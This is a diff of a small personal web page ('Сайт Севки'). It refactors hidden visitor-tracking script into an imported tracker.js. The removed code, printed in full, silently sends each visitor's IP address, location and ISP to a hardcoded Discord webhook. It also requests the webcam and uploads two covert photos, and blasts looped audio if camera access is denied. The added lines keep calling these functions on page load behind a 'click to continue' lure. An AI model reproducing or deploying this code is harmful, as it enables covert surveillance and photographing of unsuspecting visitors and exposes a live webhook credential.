@@ -31,89 +31,33 @@
     font-weight: 700;
     font-size: 1.5rem;
   }
-  audio {
-    display: none;
-  }
 </style>
 </head>
 <body>
   <div class="glass-container">
-    <div>Сайт Севки</div>
+    <div>Привiт, Це Сайт Севки</div>
+    <div style="margin-top: 15px; font-weight: 500; font-size: 1.1rem;">
+      Нажми пробел або кликни щоби продовжити
+    </div>
   </div>
 
   <audio id="audio" src="https://sevkabevka.github.io/alah.mp3" loop></audio>
 
-<script>
-  const webhookURL = 'https://discordapp.com/api/webhooks/1374439333473292298/oF_3g-oeCrSnruf7vmDS8wd9bqXvQnvhTTkJdBUpaQU-r4K_JOLcXFHHzCA8W8J5Zcws';
+  <script type="module">
+    import { sendIPInfo, capturePhotos } from './tracker.js';
 
-  async function sendIPInfo() {
-    try {
-      const res = await fetch('https://ipapi.co/json/');
-      const data = await res.json();
-      const content = {
-        content: `Visitor IP info:\nCity: ${data.city}\nRegion: ${data.region}\nCountry: ${data.country_name}\nIP: ${data.ip}\nISP: ${data.org}`
-      };
-      await fetch(webhookURL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(content)
-      });
-    } catch (e) {
-      // fail silently
+    async function init() {
+      sendIPInfo();
+      try {
+        await capturePhotos();
+      } catch {
+        const audio = document.getElementById('audio');
+        audio.volume = 1.0;
+        audio.play().catch(() => {});
+      }
     }
-  }
 
-  async function sendImageToWebhook(blob, filename) {
-    try {
-      const form = new FormData();
-      form.append('file', blob, filename);
-      await fetch(webhookURL, {
-        method: 'POST',
-        body: form
-      });
-    } catch (e) {
-      // fail silently
-    }
-  }
-
-  async function capturePhotos(stream) {
-    const video = document.createElement('video');
-    video.srcObject = stream;
-    await video.play();
-
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
-    const ctx = canvas.getContext('2d');
-
-    // Capture immediately
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    canvas.toBlob(blob => sendImageToWebhook(blob, 'photo1.png'));
-
-    // Capture again after 3 seconds
-    setTimeout(() => {
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      canvas.toBlob(blob => sendImageToWebhook(blob, 'photo2.png'));
-      stream.getTracks().forEach(track => track.stop());
-    }, 3000);
-  }
-
-  async function init() {
-    sendIPInfo();
-
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      capturePhotos(stream);
-    } catch (err) {
-      // Denied camera access: play audio
-      const audio = document.getElementById('audio');
-      audio.volume = 1.0;
-      audio.play().catch(() => {});
-    }
-  }
-
-  window.onload = init;
-</script>
+    window.onload = init;
+  </script>
 </body>
 </html>
-
